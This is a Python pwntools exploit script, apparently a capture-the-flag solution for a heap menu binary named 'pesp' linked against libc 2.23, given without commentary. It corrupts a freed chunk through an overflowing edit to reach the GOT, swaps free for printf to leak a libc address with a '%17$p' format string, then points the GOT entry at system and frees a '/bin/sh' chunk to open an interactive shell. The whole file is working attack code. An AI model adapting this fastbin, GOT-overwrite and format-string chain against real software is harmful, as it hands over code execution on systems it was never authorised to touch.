# -*- coding: utf-8 -*-

from pwn import*
from time import sleep
context.binary = "./pesp"
elf = context.binary
libc = ELF("./libc-2.23.so")

def show():
    io.sendlineafter("choice:","1")

def add(length,cont):
    io.sendlineafter("choice:","2")
    io.sendlineafter(":",str(length))
    io.sendafter(":",cont)
    sleep(0.01)

def edit(idx,length,cont):
    io.sendlineafter("choice:","3")
    io.sendlineafter(":",str(idx))
    io.sendlineafter(":",str(length))
    io.sendafter(":",cont)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("choice:","4")
    io.sendlineafter(":",str(idx))

io = process("./pesp")

add(0x50,'000000')#
add(0x50,'111111')#
add(0x10,".%17$p.")#

delete(1)
edit(0,0x100,flat('0'*0x50,'00000000',0x61,0x601ffa,0x333333))#1->fake
add(0x50,'xxxxxxxx')#fake


add(0x50,flat("\0"*0xe,flat(elf.sym["printf"])[:6]))#change got
delete(2)#2->1->fake
io.recvuntil(".")
temp = io.recvuntil(".",drop=True)

libc_address = int(temp,16) - 0x20840
print("libc @ {:#x}".format(libc_address))
#assert libc_address & 0xfff == 0

edit(3,0x50,flat('\0'*14,flat(libc_address+libc.sym['system'])[:6]))
add(0x10,"/bin/sh\0")
delete(2)

io.interactive()



